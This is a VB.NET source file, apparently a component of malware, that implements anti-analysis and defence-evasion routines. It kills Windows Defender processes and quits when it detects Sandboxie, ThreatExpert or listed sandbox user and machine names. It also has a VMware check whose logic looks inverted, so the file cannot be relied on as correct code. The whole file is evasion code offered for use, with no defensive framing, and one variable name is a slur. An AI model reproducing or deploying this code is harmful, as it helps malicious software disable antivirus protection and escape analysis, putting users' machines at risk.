'anti threatExpert, vmWare, Anubis, sandboxie, windows defender by t0fx
Public Class ant
    Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long

    Public Shared Sub mofo()
        seekit("MSASCui")
        seekit("msmpeng")
        antiSandboxie()
        IsVmWare()
        AntiThreatExpert()
        checkUsername()
        checkComputername()
    End Sub

    Private Shared Sub seekit(ByVal gay1 As String)
        For Each p As Process In Process.GetProcesses()
            If p.ProcessName.Contains(gay1) Then
                Try
                    p.Kill()
                Catch ex As Exception
                End Try
            End If
        Next
    End Sub

    Private Shared Sub checkUsername()
        Dim Usernames As New List(Of String)
        Usernames.Add("UserName")
        Usernames.Add("User")
        Usernames.Add("honey")
        Usernames.Add("sandbox")
        Usernames.Add("currentuser")
        Usernames.Add("User")
        For Each name As String In Usernames
            If Environment.UserName = name Then
                Environment.Exit(0)
            End If
        Next
    End Sub

    Private Shared Sub checkComputername()
        Dim Computername As New List(Of String)
        Computername.Add("ComputerName")
        Computername.Add("COMPUTERNAME")
        Computername.Add("DELL-D3E62F7E26")
        Computername.Add("DWI-9625AC2E275")
        Computername.Add("MICHAEL-F156CF7")
        For Each name As String In Computername
            If Environment.MachineName = name Then
                Environment.Exit(0)
            End If
        Next
    End Sub

    Public Shared Sub antiSandboxie()
        If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
            Environment.Exit(0)
        End If
    End Sub
    Public Shared Sub IsVmWare()
        Dim Hndl As Long
        Hndl = FindWindow("VMDragDetectWndClass", vbNullString)
        If Hndl = 0 Then
            Environment.Exit(0)
        End If
    End Sub

    Private Shared Sub AntiThreatExpert()
        If Process.GetCurrentProcess().MainModule.FileName.Contains("sample") Then
            Environment.Exit(0)
        End If
    End Sub
End Class
